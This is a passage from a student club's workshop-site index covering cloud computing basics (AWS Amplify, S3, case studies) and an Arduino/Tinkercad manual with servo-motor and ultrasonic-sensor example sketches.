A[AWS]\nE --&gt; B[GCP]\nE --&gt; C[Azure]</code></pre></li> </ul> </li> <li> <p>Cloud Services [AWS Amplify + AWS S3 Buckets]</p> <ul> <li>Account setup on AWS.  </li> <li> <p>Hosting a website or app using AWS on Free Tier can be done in two ways: </p> Service Purpose AWS Amplify A service dedicated to hosting websites and applications on AWS Cloud, similar to Vercel and other website/app hosting services. AWS S3 Buckets A service that provides scalable object storage containers in the cloud for data of any size and type. </li> </ul> </li> <li> <p>Hands - On Lab</p> <ul> <li>Lab - 1:    </li> <li>Lab - 2:    </li> <li>Lab - 3:    </li> </ul> </li> <li> <p>Real-World Cloud Applications</p> <ul> <li>Case studies and examples of cloud adoption. </li> <li>Industry-specific use cases. </li> </ul> Cloud Applications Case Studies and Examples Industry-Specific Use Cases Infrastructure as a Service (IAAS) Netflix: Migrated its video streaming platform to AWS, leveraging its scalability and global reach. E-commerce: Hosting websites and managing scalable infrastructure for online retail. Software as a Service (SAAS) Salesforce: Provides customer relationship management (CRM) software as a cloud-based service. Healthcare: Managing electronic health records and telehealth solutions. Platform as a Service (PAAS) Heroku: Offers a cloud application platform for developers to deploy and scale applications. Financial Services: Building and deploying fintech applications for banking and investment management. Cloud Storage and Backup Dropbox: Provides cloud storage and file synchronization services for individuals and businesses. Media and Entertainment: Storing and streaming large media files for content distribution. Big Data and Analytics Airbnb: Utilizes cloud-based data analytics to gain insights into user behavior and optimize pricing. Manufacturing: Analyzing sensor data for predictive maintenance and optimizing production processes. Internet of Things (IoT) Philips Hue: Cloud-based smart lighting system enabling remote control and automation. Smart Cities: Collecting and analyzing data from connected devices to improve urban infrastructure. </li> <li> <p>Future Trends in Cloud Computing</p> <ul> <li>Serverless computing</li> <li>Edge computing</li> <li>Artificial Intelligence (AI) and Machine Learning (ML) in the cloud  <pre><code>graph LR\nA[Future Trends] --&gt; B[Serverless Computing]\nA --&gt; C[Edge Computing]\nA --&gt; D[AI and ML in the Cloud]\n\nB --&gt; B1[Automatic Scaling]\nB --&gt; B2[Cost Optimization]\nB --&gt; B3[Event-driven Execution]\n\nC --&gt; C1[Reduced Latency]\nC --&gt; C2[Real-time Processing]\nC --&gt; C3[Beneficial for IoT and Data-intensive Workloads]\n\nD --&gt; D1[Scalable Infrastructure]\nD --&gt; D2[Development, Training, and Deployment of AI/ML Models]\nD --&gt; D3[Pre-built AI Services]</code></pre></li> </ul> </li> </ol>"},{"location":"2023-2024/Workshops/07_Intro_to_Cloud/#additional-resources","title":"\ud83c\udf10 Additional Resources","text":"<p>To continue your learning journey beyond this workshop, here are some recommended resources:</p> <ol> <li> <p>Books:</p> <ul> <li>\"Cloud Computing: Concepts, Technology &amp; Architecture\" by Thomas Erl, Ricardo Puttini, and Zaigham Mahmood \ud83d\udcda</li> <li>\"Cloud Native: Using Containers, Functions, and Data to Build Next-Generation Applications\" by Boris Scholl, Trent Swanson, and Peter Jausovec \ud83d\udcda</li> </ul> </li> <li> <p>Online Courses:</p> <ul> <li>Coursera: \"Cloud Computing Basics\" by University of Illinois at Urbana-Champaign \ud83d\udda5\ufe0f</li> <li>FreeCodeCamp : \"AWS Certified Cloud Practitioner Training 2020\" by Andrew Brown \ud83c\udf93</li> </ul> </li> </ol> <p>To make such stunning visual documentation you can refer to the MarkDown Tutorial by GDSC!</p>"},{"location":"2023-2024/Workshops/IoT_Workshop/","title":"IoT Workshop","text":"<p> WORKSHOP MANUAL <p>Intro to IoT &amp; Robotics <p>Welcome to our IoT and Robotics Network! \ud83e\udd16\ud83c\udf10 We're all about cool gadgets and smart robots! Join us for workshops where you can learn how to make things that can talk to each other (that's IoT) and build awesome robots that move and do cool stuff.</p> <p>BASICS OF ARDUINO <p>Arduino programs are written in the Arduino Integrated Development Environment (IDE). Arduino IDE is a special software running on your system that allows you to write sketches (synonym for program in Arduino language) for different Arduino boards. The Arduino programming language is based on a very simple hardware programming language called processing, which is similar to the C language. After the sketch is written in the Arduino IDE, it should be uploaded on the Arduino board for execution.</p> <p>The first step in programming the Arduino board is downloading and installing the Arduino IDE. The open-source Arduino IDE runs on Windows, Mac OS X, and Linux. Download the Arduino software (depending on your OS) from the official website and follow the instructions to install.</p> <p>STEPS TO WORK IN ARDUINO IDE: <p>Step 1 \u2212 Download Arduino IDE Software.</p> <p>You can get different versions of Arduino IDE from the Download page on the Arduino Official website. </p> <p>Step 2 \u2212 Power up your board using standard USB cable</p> <p>The Arduino Uno, Mega, Duemilanove and Arduino Nano automatically draw power from either the USB connection to the computer or an external power supply. Connect the Arduino board to your computer using the USB cable. The green power LED (labeled PWR) should glow.Arduino needs 5V power supply.</p> <p></p> <p>Step 3 \u2212 Launch Arduino IDE.</p> <p>After your Arduino IDE software is downloaded, you need to unzip the folder.</p> <p>Inside the folder, you can find the application icon with an infinity label (application.exe). Double-click the icon to start the IDE.</p> <p>Step 4 To create a new project, select File \u2192 New.</p> <p></p> <p>Step 6 \u2212 Select your Arduino board.</p> <p>To avoid any error while uploading your program to the board, you must select the correct Arduino board name, which matches with the board connected to your computer.</p> <p>Go to Tools \u2192 Board and select your board.</p> <p> Step 7 \u2212 Select your serial port.</p> <p>Select the serial device of the Arduino board. Go to Tools \u2192 Serial Port menu. This is likely to be COM3 or higher (COM1 and COM2 are usually reserved for hardware serial ports). To find out, you can disconnect your Arduino board and reopen the menu, the entry that disappears should be of the Arduino board.</p> <p>Reconnect the board and select that serial port.</p> <p>Step 8 \u2212 Upload the program to your board. </p> <p>Before explaining how we can upload our program to the board, we must demonstrate the function of each symbol appearing in the Arduino IDE toolbar.</p> <p></p> <ol> <li> <p>\u2212 Used to check if there is any compilation error.</p> </li> <li> <p>\u2212 Used to upload a program to the Arduino board.</p> </li> <li> <p>\u2212 Shortcut used to create a new sketch.</p> </li> <li> <p>\u2212 Used to directly open one of the example sketch.</p> </li> <li> <p>\u2212 Used to save your sketch.</p> </li> <li> <p>\u2212 Serial monitor used to receive serial data from the board and send the serial data to the board.</p> </li> </ol> <p>Now, simply click the \"Upload\" button in the environment. Wait a few seconds; you will see the RX and TX LEDs on the board, flashing. If the upload is successful, the message \"Done uploading\" will appear in the status bar.</p> <p>Once the installation is done you can start creating a blank program which is called as \u2018sketch\u2019 in Arduino. The structure of Arduino program is pretty simple. Arduino programs have a minimum of 2 blocks, Preparation and Execution block. Each block has a set of statements enclosed in curly braces:</p> <pre><code>void setup()\n{\n    statements-1;\n    .\n    .\n    .\n    statement-n;\n} \n\nvoid loop()   \n{ \n    statement-1;\n    .\n    .\n    .\n    statement-n;\n}\n</code></pre> <p>Here, setup ( ) is the preparation block and loop ( ) is an execution block. The setup function is the first to execute when the program is executed, and this function is called only once. The setup function is used to initialize the pin modes and start serial communication. After the setup ( ) function is executed, the execution block runs next. The execution block hosts statements like reading inputs, triggering outputs, checking conditions etc. </p> <p>In the above example loop ( ) function is a part of execution block. As the name suggests, the loop( ) function executes the set of statements (enclosed in curly braces) repeatedly.</p> <p>INTRODUCTION TO TINKERCAD <ol> <li>Create a Tinkercad Account and Create a New Project</li> </ol> <p></p> <ol> <li>Click join now and follow online instructions to create an account. Select Create a personal account.</li> </ol> <p>Create New Circuit Project</p> <p></p> <ol> <li>Select the Circuits option and Create new Circuit. </li> </ol> <p></p> <ol> <li> <p>This space is where we will place all the components. The components can be moved around, edited, and wired together.</p> </li> <li> <p>This section holds all the components. Scroll down to access component types</p> </li> <li> <p>Use this tab to rotate, delete, undo or redo. It also helps users to create and name labels for components.</p> </li> <li> <p>This option helps you program Arduino, use serial monitor, start real time simulation, export code, and share your projects.</p> </li> </ol> <p>Building the Circuit</p> <ol> <li> <p>Place all the components as in the image above by selecting them from the components section on the right side. Click on the component to select and click again anywhere on the workspace to place.</p> </li> <li> <p>Hover over the points of the module to know the output name and click it to start wiring the components.</p> </li> </ol> <p>10.While wiring click the following to bend the wire. </p> <p></p> <p>11.Click on wire to select the wire color. This helps in differentiating between wire use. For example, 5v wire color is Red and for GND(Ground) wire color is Black.</p> <p>12.Once all the wiring has been don click simulation to start the simulation</p> <p>13.Once wiring is complete, select the code option to start coding.</p> <p></p> <p>14.Use the Text option to write the code for this tutorial or use block coding.</p> <p>EXERCISE 1: <p>SPEED CONTROL OF SERVO MOTOR <p>WHAT IS SERVO MOTOR: <p>A servo motor  consists of a small electric motor, a potentiometer, control electronics, and a gearbox. The position of the output shaft is constantly measured by the internal potentiometer and compared with the target position set by the controller -Arduino. The gearbox decreases the speed of the motor, which increases the torque at the output shaft.  </p> <p>SERVO MOTOR SPECIFICATIONS : <ul> <li>Operating speed: 0.12second/ 60degree ( 4.8V no load)</li> <li>Stall Torque (4.8V): 17.5oz /in (1kg/cm)</li> <li>Operating voltage: 3.0V~7.2V</li> <li>Temperature range: -30 to +60</li> <li>Dead band width: 7usec</li> </ul> <p>CONTROLLING A SERVO MOTOR: <p>Servo motors are controlled by sending a PWM (pulse-width modulation) signal to the signal line of the servo. The width of the pulses determines the position of the output shaft. When a signal with a pulse width of 1.5 milliseconds (ms)is sent , the servo will move to the neutral position (90 degrees). The min (0 degrees) and max (180 degrees) position typically correspond to a pulse width of 1 ms and 2 ms respectively.</p> <p>RUN 1: TINKERCAD/ARDUINO CIRCUIT DIAGRAM: <p></p> <p>WIRING TABLE: Servo motor Arduino Power(red) 5V Ground(black or white) GND Signal(yellow, orange or white) Pin 9 <p>ARDUINO CODE: <p>Servo motor with Arduino example code. Position and sweep. More info: https://www.makerguides.com/ </p> <pre><code>//Include the servo library:\ninclude &lt;Servo.h&gt;\n\n//Create a new servo object:\nServo myservo;\n\n//Define the servo pin:\ndefine servoPin 9\n\n//Create a variable to store the servo position:\nint angle = 0;\nvoid setup() \n{\n    //Attach the Servo variable to a pin:\n    myservo.attach(servoPin);\n}\n\nvoid loop() \n{\n    //Sweep from 0 to 180 degrees:\n    for (angle = 0; angle &lt;= 180; angle += 1) \n    {\n        myservo.write(angle);\n        delay(15);\n    }\n\n    //Delay after reaching 180 degrees\n    delay(1000);\n\n    //Sweep back from 180 to 0 degrees:\n    for (angle = 180; angle &gt;= 0; angle -= 1) \n    {\n        myservo.write(angle);\n        delay(15);\n    }\n    //Delay after reaching 0 degrees\ndelay(1000);\n}\n</code></pre> <p>RUN 2: <p>POSITION CONTROL OF SERVOMOTOR WITH POTENTIOMETER <p>In this example, we will use the potentiometer to control the servo motor position. The original idea is that when we change the potentiometer value, the Arduino will reference this value and drive the motor to the desired position.</p> <p>TINKERCAD/ARDUINO CIRCUIT DIAGRAM: <p></p> <p>WIRING TABLE: Servo motor Arduino Power(red) 5V Ground(black or white) GND Signal(yellow,orange or white) Pin 9 Potentiometer Arduino Middle pin A0 Other two pins 5V and GND (any order) <p>ARDUINO CODE: <pre><code>include &lt;Servo.h&gt;\nServo myservo; //Create a new object of the Servo class*\n\nint angle = 0;  //Variable to store the servo position in degrees*\nint potPin = A0; //Pin connected to the potentiometer*\nint reading = 0; //Variable to store the reading from the analog input*\n\nvoid setup() \n{\n    myservo.attach(9); \n    //Pin 9 of Arduino connected to the control wire of the servo motor*\n}\n\nvoid loop() \n{\n    *reading = analogRead(potPin);                 \n    //Read the analog input fro the potentiometer*\n\n    *angle = map(reading, 0, 1023, 0, 180);        \n    //Map the input to a value between 0 and 180 degrees*\n\n    *myservo.write(angle);                         \n    // Set the servo to the calculated angle*\n\n    *delay(15);                                    \n    // Wait for the servo to reach the position*\n}\n</code></pre> <p>EXERCISE 2 : OBSTACLE DETECTION USING ULTRASONIC SENSOR HC-SR04 BUZZER AND LED <p>ULTRASONIC SENSOR HC-SR04 OVERVIEW: <p>The HC-SR04 is an affordable and easy to use distance measuring sensor which has a range from 2cm to 400cm (about an inch to 13 feet). The sensor is composed of two ultrasonic transducers. One is transmitter which outputs ultrasonic sound pulses and the other is receiver which listens for reflected waves. It\u2019s basically a sonar which is used in submarines for detecting underwater objects.</p> <p></p> <p>Specification of HC-SR04:</p> Operating Voltage 5V DC Operating Current 15mA Operating Frequency 40KHz Min Range 2cm / 1 inch Max Range 400cm / 13 feet Accuracy 3mm Measuring Angle &lt;15\u00b0 Dimension 45 x 20 x 15mm <p>HC-SR04 Ultrasonic Sensor Pinout</p> <p>Here\u2019s the pinout of the sensor:</p> <p>The sensor has 4 pins. VCC and GND go to 5V and GND pins on the Arduino, and the Trig and Echo go to any digital Arduino pin. Using the Trig pin we send the ultrasound wave from the transmitter, and with the Echo pin we listen for the reflected signal. </p> <p>RUN1: <p>HC-SR04 ULTRASONIC SENSOR WITH BUZZER AND LED: <p></p> <p>WIRING TABLE: Ultrasonic Sensor Arduino Vcc 5V Trig Pin 3 Echo Pin 2 Gnd GND Buzzer Arduino + 5V - Pin 7 (RGB) Led Arduino Cathode (-) GND Anode (+) Pin 6, 5, 4 through resistor <p>ARDUINO CODE: <pre><code>const int echoPin = 2, triggerPin = 3, redPin = 6, greenPin = 5, bluePin = 4;\nconst int buzzPin = 7;\nint pulseValue;\nfloat distance;\n\nvoid setup() \n{\n    pinMode(echoPin, INPUT);\n    pinMode(triggerPin, OUTPUT);\n    pinMode(redPin, OUTPUT);\n    pinMode(greenPin, OUTPUT);\n    pinMode(bluePin, OUTPUT);\n    pinMode(buzzPin, OUTPUT);\n    Serial.begin(9600);\n}\n\nvoid loop() \n{\n    digitalWrite(triggerPin, LOW);\n    delayMicroseconds(5);\n    digitalWrite(triggerPin, HIGH);\n    delayMicroseconds(10);\n    pulseValue = pulseIn(echoPin, HIGH);\n    distance = (pulseValue * 0.0001657 * 39.37);\n    if (distance &lt;= 10 ) \n    {\n        digitalWrite(redPin, HIGH);\n        digitalWrite(greenPin, LOW);\n        digitalWrite(bluePin, LOW);\n        tone(buzzPin, 500);\n        delay(1000);  // Delay for 2 seconds\n    } \n\n    else if (distance &lt;= 30 &amp;&amp; distance &gt; 10) \n    {\n        digitalWrite(redPin, LOW);\n        digitalWrite(greenPin, HIGH);\n        digitalWrite(bluePin, LOW);\n        tone(buzzPin, 1000);\n        delay(1000);  // Delay for 2 seconds\n    } \n\n    else if (distance &gt;30) \n    {\n        digitalWrite(redPin, LOW);\n        digitalWrite(greenPin, LOW);\n        digitalWrite(bluePin, HIGH);\n        tone(buzzPin, 1500);\n        delay(1000);  // Delay for 2 seconds\n    }\n\nSerial.print(\"Distance: \");\nSerial.print(distance);\nSerial.println(\" inches\");\ndelay(500);  // Delay between measurements\n}\n</code></pre>"}]}